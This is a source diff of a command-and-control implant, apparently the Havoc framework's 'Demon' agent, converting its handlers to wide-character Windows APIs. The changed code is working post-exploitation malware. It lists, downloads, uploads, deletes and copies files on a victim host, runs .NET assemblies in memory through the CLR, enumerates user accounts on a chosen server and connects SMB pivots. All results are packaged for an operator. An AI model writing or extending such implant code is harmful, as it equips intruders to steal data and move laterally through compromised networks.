@@ -661,42 +661,43 @@ VOID CommandFS( PPARSER DataArgs )
         {
             PUTS( "FS::Dir" )
 
-            WIN32_FIND_DATA FindData      = { 0 };
-            PCHAR           Path          = NULL;
-            DWORD           PathSize      = 0;
-            UCHAR           T[ MAX_PATH ] = { 0 };
-            HANDLE          hFile         = NULL;
-            ULARGE_INTEGER  FileSize      = { 0 };
-            SYSTEMTIME      FileTime      = { 0 };
-            SYSTEMTIME      SystemTime    = { 0 };
-            DWORD           Return        = 0;
-            BOOL            FileExplorer  = FALSE;
+            WIN32_FIND_DATAW FindData      = { 0 };
+            LPWSTR           Path          = NULL;
+            DWORD            PathSize      = 0;
+            UCHAR            T[ MAX_PATH ] = { 0 };
+            HANDLE           hFile         = NULL;
+            ULARGE_INTEGER   FileSize      = { 0 };
+            SYSTEMTIME       FileTime      = { 0 };
+            SYSTEMTIME       SystemTime    = { 0 };
+            DWORD            Return        = 0;
+            BOOL             FileExplorer  = FALSE;
 
             FileExplorer     = ParserGetInt32( DataArgs );
             Path             = ParserGetBytes( DataArgs, &PathSize );
-            Path[ PathSize ] = NULL;
 
             PRINTF( "FileExplorer: %s [%d]\n", FileExplorer ? "TRUE" : "FALSE", FileExplorer )
-            PRINTF( "Path        : %s\n", Path )
+            PRINTF( "Path        : %ls\n", Path )
 
             PackageAddInt32( Package, FileExplorer );
 
-            if ( Path[ 0 ] == '.' )
+            if ( Path[ 0 ] == L'.' )
             {
-                if ( ! ( Return = Instance->Win32.GetCurrentDirectoryA( MAX_PATH, &T ) ) )
+                if ( ! ( Return = Instance->Win32.GetCurrentDirectoryW( MAX_PATH * 2, &T ) ) )
                 {
                     PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 }
                 else
-                    PackageAddBytes( Package, T, Return );
+                    PackageAddBytes( Package, T, Return * 2 );
             }
             else
             {
-                PackageAddBytes( Package, Path, PathSize );
+                PackageAddBytes( Package, Path, PathSize * 2 );
             }
 
-            hFile = Instance->Win32.FindFirstFileA( Path, &FindData );
+            MemSet( &FindData, 0, sizeof( FindData ) );
+
+            hFile = Instance->Win32.FindFirstFileW( Path, &FindData );
             if ( hFile == INVALID_HANDLE_VALUE )
             {
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
@@ -731,9 +732,9 @@ VOID CommandFS( PPARSER DataArgs )
                 PackageAddInt32( Package, SystemTime.wSecond );
                 PackageAddInt32( Package, SystemTime.wMinute );
                 PackageAddInt32( Package, SystemTime.wHour );
-                PackageAddBytes( Package, FindData.cFileName, StringLengthA( FindData.cFileName ) );
+                PackageAddBytes( Package, FindData.cFileName, StringLengthW( FindData.cFileName ) * 2 );
             }
-            while ( Instance->Win32.FindNextFileA( hFile, &FindData ) );
+            while ( Instance->Win32.FindNextFileW( hFile, &FindData ) );
 
             PUTS( "Close File Handle" )
             Instance->Win32.FindClose( hFile );
@@ -743,23 +744,24 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 2:
         {
+            // TODO: update UNICODE string
             PUTS( "FS::Download" )
 
             DWORD  FileSize = 0;
             DWORD  Read     = 0;
             DWORD  NameSize = 0;
-            PCHAR  FileName = ParserGetBytes( DataArgs, &NameSize );
+            LPWSTR FileName = ParserGetBytes( DataArgs, &NameSize );
             HANDLE hFile    = NULL;
             PVOID  Content  = NULL;
 
             FileName[ NameSize ] = 0;
 
-            PRINTF( "FileName => %s", FileName )
+            PRINTF( "FileName => %ls", FileName )
 
-            hFile = Instance->Win32.CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
+            hFile = Instance->Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
             if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
             {
-                PUTS( "CreateFileA: Failed" )
+                PUTS( "CreateFileW: Failed" )
                 CALLBACK_GETLASTERROR
                 goto CleanupDownload;
             }
@@ -796,12 +798,13 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 3:
         {
+            // TODO: update UNICODE string
             PUTS( "FS::Upload" )
 
             DWORD  FileSize = 0;
             DWORD  NameSize = 0;
             DWORD  Written  = 0;
-            PCHAR  FileName = ParserGetBytes( DataArgs, &NameSize );
+            LPWSTR FileName = ParserGetBytes( DataArgs, &NameSize );
             PVOID  Content  = ParserGetBytes( DataArgs, &FileSize );
             HANDLE hFile    = NULL;
 
@@ -809,11 +812,11 @@ VOID CommandFS( PPARSER DataArgs )
 
             PRINTF( "FileName => %s (FileSize: %d)", FileName, FileSize )
 
-            hFile = Instance->Win32.CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
+            hFile = Instance->Win32.CreateFileW( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
 
             if ( hFile == INVALID_HANDLE_VALUE )
             {
-                PUTS( "CreateFileA: Failed" )
+                PUTS( "CreateFileW: Failed" )
                 CALLBACK_GETLASTERROR
                 goto CleanupUpload;
             }
@@ -837,11 +840,12 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 4:
         {
+            // TODO: update UNICODE string
             PUTS( "FS::Cd" )
-            DWORD PathSize = 0;
-            PCHAR Path     = ParserGetBytes( DataArgs, &PathSize );
+            DWORD  PathSize = 0;
+            LPWSTR Path     = ParserGetBytes( DataArgs, &PathSize );
 
-            if ( ! Instance->Win32.SetCurrentDirectoryA( Path ) )
+            if ( ! Instance->Win32.SetCurrentDirectoryW( Path ) )
             {
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 goto LEAVE;
@@ -856,14 +860,15 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 5:
         {
+            // TODO: update UNICODE string
             PUTS( "FS::Remove" )
-            DWORD PathSize = 0;
-            PCHAR Path     = ParserGetBytes( DataArgs, &PathSize );
-            DWORD dwAttrib = Instance->Win32.GetFileAttributesA( Path );
+            DWORD  PathSize = 0;
+            LPWSTR Path     = ParserGetBytes( DataArgs, &PathSize );
+            DWORD  dwAttrib = Instance->Win32.GetFileAttributesW( Path );
 
             if ( dwAttrib != INVALID_FILE_ATTRIBUTES && ( dwAttrib & FILE_ATTRIBUTE_DIRECTORY ) )
             {
-                if ( ! Instance->Win32.RemoveDirectoryA( Path ) )
+                if ( ! Instance->Win32.RemoveDirectoryW( Path ) )
                 {
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     goto LEAVE;
@@ -875,7 +880,7 @@ VOID CommandFS( PPARSER DataArgs )
             }
             else
             {
-                if ( ! Instance->Win32.DeleteFileA( Path ) )
+                if ( ! Instance->Win32.DeleteFileW( Path ) )
                 {
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                     goto LEAVE;
@@ -892,11 +897,12 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 6:
         {
+            // TODO: update UNICODE string
             PUTS( "FS::Mkdir" )
-            DWORD PathSize = 0;
-            PCHAR Path     = ParserGetBytes( DataArgs, &PathSize );
+            DWORD  PathSize = 0;
+            LPWSTR Path     = ParserGetBytes( DataArgs, &PathSize );
 
-            if ( ! Instance->Win32.CreateDirectoryA( Path, NULL ) )
+            if ( ! Instance->Win32.CreateDirectoryW( Path, NULL ) )
             {
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                 goto LEAVE;
@@ -909,11 +915,12 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 7: PUTS( "FS::Copy" )
         {
-            DWORD FromSize = 0;
-            DWORD ToSize   = 0;
-            LPSTR PathFrom = NULL;
-            LPSTR PathTo   = NULL;
-            BOOL  Success  = FALSE;
+            // TODO: update UNICODE string
+            DWORD  FromSize = 0;
+            DWORD  ToSize   = 0;
+            LPWSTR PathFrom = NULL;
+            LPWSTR PathTo   = NULL;
+            BOOL   Success  = FALSE;
 
             PathFrom = ParserGetBytes( DataArgs, &FromSize );
             PathTo   = ParserGetBytes( DataArgs, &ToSize );
@@ -923,7 +930,7 @@ VOID CommandFS( PPARSER DataArgs )
 
             PRINTF( "Copy file %s to %s\n", PathFrom, PathTo )
 
-            Success = Instance->Win32.CopyFileA( PathFrom, PathTo, FALSE );
+            Success = Instance->Win32.CopyFileW( PathFrom, PathTo, FALSE );
             if ( ! Success )
                 CALLBACK_GETLASTERROR
 
@@ -936,17 +943,18 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 9:
         {
+            // TODO: update UNICODE string
             PUTS( "FS::GetPwd" )
-            UCHAR Path[ MAX_PATH * 2 ] = { 0 };
+            WCHAR Path[ MAX_PATH * 2 ] = { 0 };
             DWORD Return               = 0;
 
-            if ( ! ( Return = Instance->Win32.GetCurrentDirectoryA( MAX_PATH * 2, &Path ) ) )
+            if ( ! ( Return = Instance->Win32.GetCurrentDirectoryW( MAX_PATH * 2, &Path ) ) )
             {
                 PRINTF( "Failed to get current dir: %d\n", NtGetLastError() );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             }
             else
-                PackageAddBytes( Package, Path, Return );
+                PackageAddBytes( Package, Path, Return * 2 );
 
             break;
         }
@@ -958,18 +966,18 @@ VOID CommandFS( PPARSER DataArgs )
             DWORD  FileSize = 0;
             DWORD  Read     = 0;
             DWORD  NameSize = 0;
-            PCHAR  FileName = ParserGetBytes( DataArgs, &NameSize );
+            LPWSTR FileName = ParserGetBytes( DataArgs, &NameSize );
             HANDLE hFile    = NULL;
             PVOID  Content  = NULL;
 
             FileName[ NameSize ] = 0;
 
-            PRINTF( "FileName => %s", FileName )
+            PRINTF( "FileName => %ls", FileName )
 
-            hFile = Instance->Win32.CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
+            hFile = Instance->Win32.CreateFileW( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
             if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
             {
-                PUTS( "CreateFileA: Failed" )
+                PUTS( "CreateFileW: Failed" )
                 CALLBACK_GETLASTERROR
                 goto CleanupCat;
             }
@@ -1492,59 +1500,49 @@ VOID CommandToken( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 }
 
-
 VOID CommandAssemblyInlineExecute( PPARSER DataArgs )
 {
-    PPACKAGE PackageInfo                = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
-
-    SIZE_T  AppDomainNameSize           = 0;
-    SIZE_T  NetVersionSize              = 0;
-    SIZE_T  assemblyBytesLen            = 0;
-    SIZE_T  ArgumentsLen                = 0;
-
-    PUCHAR  pipePath                    = ParserGetBytes( DataArgs, NULL);
-    PUCHAR  AppDomainName               = ParserGetBytes( DataArgs, &AppDomainNameSize);
-    PUCHAR  NetVersion                  = ParserGetBytes( DataArgs, &NetVersionSize);
-    PUCHAR  assemblyBytes               = ParserGetBytes( DataArgs, &assemblyBytesLen);
-    PUCHAR  Arguments                   = ParserGetBytes( DataArgs, &ArgumentsLen);
-
-    WCHAR   wAppDomainName[ MAX_PATH ]  = { 0 };
-    WCHAR   wNetVersion[ 20 ]           = { 0 };
-    PWCHAR  wArguments                  = Instance->Win32.LocalAlloc( LPTR, ArgumentsLen * sizeof( WCHAR ) );
-
-    // CLR & .Net Instances
-    ICLRMetaHost*       pClrMetaHost        = { NULL };
-    ICLRRuntimeInfo*    pClrRuntimeInfo     = { NULL };
-    ICorRuntimeHost*    pICorRuntimeHost    = { NULL };
-    IEnumUnknown*       pEnumClr            = { NULL };
-    ICLRRuntimeInfo*    pRunTimeInfo        = { NULL };
-    Assembly*           pAssembly           = { NULL };
-    IUnknown*           pAppDomainThunk     = { NULL };
-    AppDomain*          pAppDomain          = { NULL };
-    MethodInfo*         pMethodInfo         = { NULL };
-    VARIANT             vtPsa               = { 0 };
-    LPVOID              pvData              = { NULL };
-
-    //Attach or create console
-    BOOL                attConsole          = FALSE;
+    PPACKAGE         PackageInfo       = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
+    SIZE_T           AppDomainNameSize = 0;
+    SIZE_T           NetVersionSize    = 0;
+    SIZE_T           assemblyBytesLen  = 0;
+    SIZE_T           ArgumentsLen      = 0;
+    PUCHAR           pipePath          = ParserGetBytes( DataArgs, NULL );
+    PUCHAR           AppDomainName     = ParserGetBytes( DataArgs, &AppDomainNameSize );
+    PUCHAR           NetVersion        = ParserGetBytes( DataArgs, &NetVersionSize );
+    PUCHAR           assemblyBytes     = ParserGetBytes( DataArgs, &assemblyBytesLen );
+    PUCHAR           Arguments         = ParserGetBytes( DataArgs, &ArgumentsLen );
+    ICLRMetaHost*    pClrMetaHost      = { NULL };
+    ICLRRuntimeInfo* pClrRuntimeInfo   = { NULL };
+    ICorRuntimeHost* pICorRuntimeHost  = { NULL };
+    IEnumUnknown*    pEnumClr          = { NULL };
+    ICLRRuntimeInfo* pRunTimeInfo      = { NULL };
+    Assembly*        pAssembly         = { NULL };
+    IUnknown*        pAppDomainThunk   = { NULL };
+    AppDomain*       pAppDomain        = { NULL };
+    MethodInfo*      pMethodInfo       = { NULL };
+    VARIANT          vtPsa             = { 0 };
+    LPVOID           pvData            = { NULL };
+    BOOL             attConsole        = FALSE;
+    WCHAR            wNetVersion[ 20 ] = { 0 };
+    PWCHAR           wArguments        = Instance->Win32.LocalAlloc( LPTR, ArgumentsLen * sizeof( WCHAR ) );
+    WCHAR            wAppDomainName[ MAX_PATH ] = { 0 };
 
     // Convert Ansi Strings to Wide Strings
     CharStringToWCharString( wAppDomainName, AppDomainName, AppDomainNameSize );
     CharStringToWCharString( wNetVersion, NetVersion, NetVersionSize );
     CharStringToWCharString( wArguments, Arguments, ArgumentsLen );
 
-#ifdef DEBUG
-    printf("[^] pipePath          : %s\n", pipePath);
-    printf("[^] AppDomainName     : %ls\n", wAppDomainName);
-    printf("[^] NetVersion        : %ls\n", wNetVersion);
-    printf("[^] assemblyBytes[%d] : %p\n", assemblyBytesLen, assemblyBytes);
-    printf("[^] Arguments         : %ls\n", wArguments);
-#endif
+    PRINTF( "[^] pipePath          : %ls\n", pipePath );
+    PRINTF( "[^] AppDomainName     : %ls\n", wAppDomainName );
+    PRINTF( "[^] NetVersion        : %ls\n", wNetVersion );
+    PRINTF( "[^] assemblyBytes[%d] : %p\n",  assemblyBytesLen, assemblyBytes );
+    PRINTF( "[^] Arguments         : %ls\n", wArguments );
 
     if ( assemblyBytes == NULL ) return;
 
-    HANDLE mainHandle   = Instance->Win32.CreateNamedPipeA( pipePath, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 65535, 65535, 0, NULL );
-    HANDLE hFile        = Instance->Win32.CreateFileA( pipePath, GENERIC_WRITE, FILE_SHARE_READ, (LPSECURITY_ATTRIBUTES) NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
+    HANDLE mainHandle   = Instance->Win32.CreateNamedPipeW( pipePath, PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 65535, 65535, 0, NULL );
+    HANDLE hFile        = Instance->Win32.CreateFileW( pipePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
 
     attConsole = Instance->Win32.GetConsoleWindow( ) != NULL;
     if ( attConsole != 1 )
@@ -1687,10 +1685,10 @@ VOID CommandAssemblyInlineExecute( PPARSER DataArgs )
     DWORD   bytesRead       = 0;
     LPVOID  AssemblyOutput  = Instance->Win32.LocalAlloc( LPTR, BytesToRead );
 
+    PUTS( "Reading pipe" )
     //TODO: Replace with NtReadFile
     Instance->Win32.ReadFile( mainHandle, AssemblyOutput, BytesToRead, &bytesRead, NULL );
     Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, stdOutput );
-
 
     PPACKAGE package = PackageCreate( DEMON_OUTPUT );
     PackageAddBytes( package, AssemblyOutput, bytesRead );
@@ -1755,6 +1753,7 @@ Cleanup:
         pClrMetaHost->lpVtbl->Release( pClrMetaHost );
         pClrMetaHost = NULL;
     }
+    PUTS( "Finished with Assembly inline execute" )
 }
 
 VOID CommandAssemblyListVersion( VOID )
@@ -2396,38 +2395,21 @@ VOID CommandNet( PPARSER Parser )
             DWORD          EntriesRead  = 0;
             DWORD          TotalEntries = 0;
             DWORD          Resume       = 0;
-
             LPWSTR         ServerName   = NULL;
             DWORD          ServerSize   = 0;
-            CHAR           User[ 260 ]  = { 0 };
-            DWORD          UserSize     = 0;
 
             ServerName = ParserGetBytes( Parser, &ServerSize );
             PackageAddBytes( Package, ServerName, ServerSize );
 
-            NetStatus = Instance->Win32.NetUserEnum( NULL, 0, 0, &UserInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &Resume );
-            PRINTF( "NetStatus => %d\n", NetStatus );
+            NetStatus = Instance->Win32.NetUserEnum( ServerName, 0, 0, &UserInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &Resume );
             if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
             {
-                PRINTF( "EntriesRead => %d\n", EntriesRead );
-                for( DWORD i = 0; i < EntriesRead; i++ )
+                for ( DWORD i = 0; i < EntriesRead; i++ )
                 {
                     if ( UserInfo[ i ].usri0_name )
                     {
-                        UserSize = WCharStringToCharString( User, UserInfo[ i ].usri0_name, StringLengthW( UserInfo[ i ].usri0_name ) );
-                        User[ UserSize ] = 0;
-
-                        PackageAddBytes( Package, User, UserSize );
-
-                        // TODO: add this
-                        /* if ( ( UserInfo[ i ].usri3_priv & USER_PRIV_ADMIN ) == 0 )
-                            PackageAddInt32( Package, FALSE );
-                        else
-                            PackageAddInt32( Package, TRUE ); */
-
-                        PackageAddInt32( Package, FALSE );
-
-                        MemSet( User, 0, 260 );
+                        PackageAddBytes( Package, UserInfo[ i ].usri0_name, StringLengthW( UserInfo[ i ].usri0_name ) * 2 );
+                        PackageAddInt32( Package, FALSE ); // TODO: fix this.
                     }
                 }
 
@@ -2493,9 +2475,9 @@ VOID CommandPivot( PPARSER Parser )
         {
             PUTS( "DEMON_PIVOT_SMB_CONNECT" )
 
-            DWORD BytesSize = 0;
-            PVOID Output    = NULL;
-            LPSTR PipeName  = NULL;
+            DWORD  BytesSize = 0;
+            PVOID  Output    = NULL;
+            LPWSTR PipeName  = NULL;
 
             PipeName = ParserGetBytes( Parser, NULL );
 
